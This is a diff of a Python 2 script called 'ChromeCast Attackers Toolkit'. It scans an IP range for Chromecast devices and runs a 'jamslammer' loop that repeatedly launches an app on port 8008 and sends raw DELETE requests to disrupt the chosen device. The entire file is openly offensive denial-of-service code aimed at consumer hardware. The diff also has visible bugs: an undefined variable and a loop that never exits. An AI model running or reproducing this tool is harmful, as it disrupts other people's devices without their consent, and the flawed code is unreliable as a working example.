@@ -1,19 +1,13 @@
 import socket
+import time
 import urllib
 import urllib2
 from netaddr import IPRange
 
 
-def jam(HOST,PORT):
-	lag_time = 0 #Time to wait after starting app before closing it.
-	set_time = 10 #Time between runs
-	executions = -1 #If set to a negative number, will run forever.
-	execute_time = None #If set, overrides executions, will run attack for this many seconds
-	if execute_time is not None:
-		start_time = time.time()
-		executions = -1
-	executions += 1
-	while executions != 1:
+def jam(HOST,PORT,timing):
+	timebool = 1
+	while timebool:
 
 		url = 'http://' + HOST + ':' + str(PORT) + '/apps/Songza_App'
 		values = {'_':'1111111111111111'}
@@ -22,27 +16,23 @@ def jam(HOST,PORT):
 		reqs = urllib2.Request(url, data)
 		resp = urllib2.urlopen(reqs)
 		dat = resp.read()
-
-		time.sleep(lag_time)
-
+		
+		time.sleep(.1)
+		
 		s = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
 		s.connect((HOST, PORT))
-
 		req = "DELETE /apps/Songza_App HTTP/1.1\r\nHost: " + HOST + ":" + str(PORT) + "\r\nAccept: */*\r\nContent-Type: application/json\r\n\r\n"
 		s.sendall(req)
 		data = s.recv(10240)
 		print data
-	
-		executions -= 1
-		if executions < -1000000:
-			executions = -1
 		
-		if execute_time is not None:
-			if time.time() > (start_time + execute_time):
-				executions = 1
+		time.sleep(1.5)
 		
-		time.sleep(set_time)
-		choose()
+		if timing == "1":
+			timebool = 1
+		elif timing == "2":
+			timebool = 2
+	choose()
 		
 def chromecast_finder(addresses):
 	ccasts = []
@@ -61,20 +51,23 @@ def chromecast_finder(addresses):
 			print "0"
 			print ""
 	print ""
+	print ""
 	return ccasts		
-def choose(casts):
+def choose():
 	option = raw_input("> ")
 	if option == '1':
-		
+		print "[1] Continuous"
+		print "[2] Short"
+		attacklen = raw_input("> ")
 		for x in range(0,len(casts) - 1):
 			print '['+str(x)+'] '+str(casts[x])
 		ip_attack = raw_input("Which Chromecast to attack: ")
 		ip_attack2 = casts[int(ip_attack)]
 		
-		jam(str(ip_attack2),"8008")
+		jam(str(ip_attack2),8008, str(attacklen))
 	else:
 		print "Invalid input, try again"
-		choose(casts)
+		choose()
 		
 
 print "ChromeCast Attackers Toolkit"
@@ -82,7 +75,7 @@ print ''
 addresses = list(IPRange(raw_input('Start IP: '), raw_input('End IP: ')))
 casts = chromecast_finder(addresses)
 print "[1] Chrome jamslammer"
-choose(casts)
+choose()
 
 	
 
